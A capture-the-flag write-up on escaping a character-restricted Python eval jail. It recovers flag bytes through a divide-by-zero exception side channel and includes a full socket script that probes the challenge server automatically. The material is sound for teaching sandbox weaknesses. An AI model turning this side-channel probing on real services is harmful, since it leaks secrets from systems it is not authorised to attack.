# Challenge Write-up: **SPEECHLESS**

**Path:** `writeups/infobahn-ctf-2025/misc_speechless`
**Difficulty:** Medium (restricted eval + side-channel by exceptions)

---

## Problem statement (brief)

A remote REPL accepts single-line expressions and evaluates them with `eval(expr, {"a": a} | bmap)`. The environment exposes:

* `a`: previous evaluation result (initially `None`),
* `b`, `bb`, `bbb`, ... each mapped to one byte of `flag` (i.e. `b` = flag[0], `bb` = flag[1], ...).

Restrictions:

* Allowed characters: only `a b . = - /` (no parentheses, no digits, no `*`, no `+`, no spaces).
* Any expression containing `==` with `a` or `b...` is rejected.
* You see only textual feedback: prompt, rejection messages, or `stop breaking things >:(` when an exception occurs.

Goal: recover the flag using only these limited expressions and the exception side-channel.

---

## Code idea (short)

Use a divide-by-zero side-channel as an equality test. The primitive:

1. Set `a` to the byte value of a known anchor (e.g. an index inside a known prefix like `infobhan{`).
2. Subtract target byte from `a`: `a-bbbbb...`: this sets `a = anchor - b_target`.
3. Evaluate `b(anchor)/a`: if `a == 0` (i.e. target == anchor) this raises `ZeroDivisionError` and the server prints `stop breaking things >:(`: observable to us.
4. Reset `a` back to the anchor value and repeat for next target.

This yields a binary test (exception/no-exception) that tells whether two positions hold the same byte.

---

## Example detection sequence (concrete expressions)

Assume anchor at position `p` (name `b...` with `p` copies of `b`) and target at `t`:

1. `a-b{t}`  (sends `a-bbb...`: sets `a = a - b_t`; when `a` initially equals anchor, result is `anchor - b_t`)
2. `b{p}/a` (sends `bb.../a`: raises ZeroDivisionError iff `anchor - b_t == 0`)

Note: because there are no spaces allowed in the actual challenge instance you must send expressions without spaces (the script uses none).

---

## Sample automation script (abbreviated): uses the above idea

Below is the full script used to probe anchors 1..9 (known `infobhan{`) against targets 10..55 and build a flag template.

```python
"""
match_known_against_all.py
For each known anchor (positions 1..9 from "infobahn{"), set ⁠a⁠ to that byte,
then test every target position j in 10..55 by:
  1) sending: a-bbbbb...   (sets a = a - b_j)
  2) sending: b(anchor)/a  (if a == 0 -> ZeroDivisionError -> visible message)
After each test the script resets 'a' by sending the anchor again (so the next
test starts with a fresh anchor value).
No spaces are used in the expressions (the challenge rejects spaces).
"""
import socket
import time

HOST = "speechless.challs.infobahnc.tf"
PORT = 1337
PROMPT = b">>> "
LENGTH = 55

def recv_until_prompt(s, timeout=2.0):
    s.settimeout(0.5)
    buf = b""
    start = time.time()
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if PROMPT in buf:
                last = buf.rfind(PROMPT)
                out = buf[:last]
                return out.decode(errors="replace")
        except socket.timeout:
            if time.time() - start > timeout:
                break
    return buf.decode(errors="replace")

def send_cmd_and_get(s, cmd, timeout=1.0):
    """Send cmd (string) with newline, read until next prompt (or timeout)."""
    s.sendall(cmd.encode() + b"\n")
    return recv_until_prompt(s, timeout)

def bname(n):
    return "b" * n

def main():
    anchors = {
        1: 'i',
        2: 'n',
        3: 'f',
        4: 'o',
        5: 'b',
        6: 'a',
        7: 'h',
        8: 'n',
        9: '{',
        10: 'i', 
        11: "_",
        19: "e",
        20: 'l',
        23: "v",
        38: "s"
    }

    # choose unique anchor positions (don't duplicate 'n' at 2 and 8)
    unique_anchors = [1,2,3,4,5,6,7,9]

    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.create_connection((HOST, PORT), timeout=10)
    intro = recv_until_prompt(s, timeout=2.0)
    print("[<] intro:", intro.strip())

    matches = {}  # matches[target] = list of anchor positions that match it
    for j in range(10, LENGTH + 1):
        matches[j] = []

    # For each anchor, set a to that anchor's value, then test all targets
    for anchor_pos in unique_anchors:
        print(f"[*] Using anchor b{anchor_pos} ('{anchors[anchor_pos]}') ...")
        # set a = b(anchor)
        resp = send_cmd_and_get(s, bname(anchor_pos))
        # iterate all target positions
        for target in range(10, LENGTH + 1):
            # 1) set a := a - b_target
            expr1 = "a-" + bname(target)
            _ = send_cmd_and_get(s, expr1)
            # 2) divide anchor by a (this raises ZeroDivisionError iff a == 0)
            expr2 = bname(anchor_pos) + "/a"
            resp2 = send_cmd_and_get(s, expr2)
            if "stop breaking things >:(" in resp2:
                # match found
                matches[target].append(anchor_pos)
                print(f"    [=] target b{target} == b{anchor_pos}")
            # finally, reset a back to the anchor value for next iteration
            _ = send_cmd_and_get(s, bname(anchor_pos))
            # small pause to be polite / avoid flooding
            time.sleep(0.01)

    s.close()

    # Print results grouped by anchor and a template of the flag
    print("\n[*] Matches found (target -> anchors):")
    for t in range(10, LENGTH + 1):
        print(f" b{t}: anchors {matches[t]}")

    # build a template using clusters we already know from earlier run (you can
    # either paste clusters manually here or the script will at least print matches)
    # For convenience print a position -> char / placeholder line for 1..55:
    # known positions 1..9 are from "infobahn{"
    template = ["?"] * (LENGTH + 1)  # 1-indexed
    template[1] = 'i'
    template[2] = 'n'
    template[3] = 'f'
    template[4] = 'o'
    template[5] = 'b'
    template[6] = 'a'
    template[7] = 'h'
    template[8] = 'n'
    template[9] = '{'

    # mark matches where an anchor matched: if a target matched an anchor, fill with that anchor char
    for t in range(10, LENGTH + 1):
        if matches[t]:
            # if multiple anchors matched (rare), prefer the first
            anchor_pos = matches[t][0]
            template[t] = anchors[anchor_pos]
        else:
            template[t] = '?'

    # print readable template
    print("\nFlag template (positions 1..55):")
    out = "".join(template[1:])  # drop index 0
    print(out)
    print("\nLegend: '?' = unknown (no anchor matched from 1..9).")

if __name__ == "__main__":
    main()

# Result:
# infobahn{i_?an??_b??i???_i_????_???i??i?_in_a_?ai?_???}
```
---

## Result & template

After running the script, the first recovered template looked like:

```
infobahn{i_?an??_b??i???_i_????_???i??i?_in_a_?ai?_???}
```

`?` indicates positions that did not match any anchor among 1..9 and thus remain unknown.
just use trial and error method to find out other remaining characters.

